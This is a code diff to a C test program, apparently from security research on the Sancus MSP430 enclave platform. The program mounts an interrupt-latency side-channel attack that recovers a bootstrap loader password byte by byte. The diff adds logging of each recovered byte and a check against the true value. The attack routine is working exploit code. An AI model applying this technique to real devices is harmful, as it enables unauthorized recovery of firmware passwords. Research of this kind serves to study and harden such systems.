@@ -14,6 +14,9 @@
 #define NOP_INTERVAL 11
 #define NOP_LATENCY 1
 
+char *ivt = (char*) INTERRUPT_VECTOR_START;
+char guess[BSL_PASSWORD_LENGTH] = {0};
+
 unsigned int step = 1;
 unsigned int byte_index = 0;
 bool correct = false;
@@ -23,6 +26,9 @@ void attacker_isr(void) {
     if (step == FIRST_NOP_POINT + byte_index * NOP_INTERVAL) {
         if (latency == NOP_LATENCY) {
             correct = true;
+            pr_info2("Found pwd[%d]=0x%x\n", byte_index, guess[byte_index] & 0xff);
+            if (guess[byte_index] != ivt[byte_index])
+                pr_info("error: guess wrong");
         }
     }
     step++;
@@ -35,7 +41,6 @@ int main(void)
     sancus_enable(&sm_bsl);
 
     char ivt_wrong1[BSL_PASSWORD_LENGTH], ivt_wrong2[BSL_PASSWORD_LENGTH];
-    char *ivt = (char*) INTERRUPT_VECTOR_START;
     for (int i = 0; i < BSL_PASSWORD_LENGTH; i++, ivt++)
     {
         pr_info2("ivt[%d] is 0x%x\n", i, *ivt & 0xff);
@@ -73,17 +78,13 @@ int main(void)
     pr_info1("Balanced: wrong pwd[0]+[1] bytes with TSC %d\n", tsc4);
 
     if (tsc1 + 2 != tsc2)
-        pr_info("--> WARNING: unbalanced BSL is not retarded by two cycles.\n");
+        pr_info("--> error: unbalanced BSL is not retarded by two cycles.\n");
     else if (tsc3 != tsc4)
-        pr_info("--> WARNING: hardened BSL pwd comparison is unbalanced..\n");
+        pr_info("--> error: hardened BSL pwd comparison is unbalanced..\n");
     else
         pr_info("--> OK");
 
     /** Attack balanced BSL byte per byte through IRQ latency **/
-
-    char guess[BSL_PASSWORD_LENGTH];
-    for (int i = 0; i < BSL_PASSWORD_LENGTH; i++)
-        guess[i] = 0xaa;
 
     for (byte_index = 0; byte_index < BSL_PASSWORD_LENGTH; byte_index++)
     {
@@ -99,10 +100,6 @@ int main(void)
         }
     }
 
-    for (int i = 0; i < BSL_PASSWORD_LENGTH; i++)
-    {
-        pr_info2("guess[%d] is 0x%x\n", i, guess[i] & 0xff);
-    }
     EXIT();
 }
 
